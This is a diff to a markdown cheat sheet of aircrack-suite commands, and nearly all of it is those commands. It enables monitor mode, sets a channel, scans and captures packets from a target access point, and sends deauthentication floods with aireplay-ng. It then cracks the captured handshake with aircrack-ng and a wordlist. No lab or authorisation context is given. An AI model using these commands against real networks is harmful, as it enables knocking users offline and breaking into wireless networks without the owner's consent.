@@ -1,13 +1,20 @@
-### enable monitor mode
-```
+### Enable monitor mode
+``` bash
 sudo ifconfig wlan0 down
+# sudo airmon-ng check kill
 sudo airmon-ng start wlan0
 ```
 
 
+### Set Channel
 
-### airodump-ng scanning
+``` bash
+sudo iw dev wlan0mon set channel 8
 ```
+
+
+### Airodump-ng scanning
+``` bash
 sudo airodump-ng wlan0mon
 
 # ex)
@@ -19,14 +26,14 @@ sudo airodump-ng wlan0mon
 ```
 
 
-### save traffic packets
-```
+### Save traffic packets
+``` bash
 sudo airodump-ng --bssid 00:00:00:00:00:00 -w filename wlan0mon
 ```
 
 
-### execute aireplay-ng
-```
+### Execute aireplay-ng
+``` bash
 sudo aireplay-ng --deauth 100 -a 00:00:00:00:00:00 wlan0mon
 
 # ex)
@@ -50,16 +57,15 @@ sudo python3 deauth.py
 
 
 
-### aireplay-ng error : (wlan0mon is on channel 2, but the AP uses channel 5)
-```
+### Aireplay-ng error : (wlan0mon is on channel 2, but the AP uses channel 5)
+``` bash
 sudo airmon-ng start wlan0mon 5
-or)
 sudo iwconfig wlan0mon channel 5
 ```
 
 
 
-### crack password
-```
+### Cracking password
+``` bash
 sudo aircrack-ng filename.cap -w dict.lst
 ```
